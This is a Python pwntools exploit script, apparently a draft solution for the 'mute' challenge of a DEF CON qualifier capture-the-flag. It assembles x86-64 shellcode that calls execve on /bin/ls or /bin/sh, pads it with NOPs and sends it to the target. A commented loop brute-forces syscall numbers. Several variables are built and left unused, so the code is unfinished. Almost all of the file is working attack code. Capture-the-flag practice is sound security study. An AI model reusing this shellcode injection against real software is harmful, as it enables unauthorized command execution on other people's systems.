#!/usr/bin/env python
from pwn import *

context.arch = "amd64"
binary_name = "./mute"
conn = process(binary_name)
# conn = remote("mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me", 443)

# conn.recvuntil("SILENCE")

iloop = shellcraft.infloop()
open_file = shellcraft.open("./flag")
read_file = shellcraft.read("rax", 'rsp', 3)


# # Hacks using X32
test = shellcraft.pushstr("/bin/ls\x00")
test += shellcraft.mov("rdi", "rsp")
test += shellcraft.mov("rsi", "0")
test += shellcraft.mov("rdx", "0")
test += shellcraft.syscall(59);#| 0x40000000




# print open_file
conn.recvuntil("SILENCE")
sc = """
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */

"""
sc = shellcraft.pushstr("/bin///sh")

sc += shellcraft.syscall(59)
print sc
payload = asm(test)


payload += "\x90"*(4096-len(payload))

with open("./payload", "w") as f:
	f.write(payload)
conn.sendline(payload)
# conn.
# sleep(1)
# conn.interactive()
v = False
while not v:
	v = conn.poll()
print v

# for x in range(100):
# 	conn = process(binary_name)
	# conn = remote("mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me", 443)

	# conn.recvuntil("SILENCE")
	# payload = asm(shellcraft.syscall(x))


	# payload += "\x90"*(4096-len(payload))

	# with open("./payload", "w") as f:
	# 	f.write(payload)
	# conn.sendline(payload)
	# # conn.
	# # sleep(1)
	# # conn.interactive()
	# v = False
	# while not v:
	# 	v = conn.poll()
	# print x
	# print v

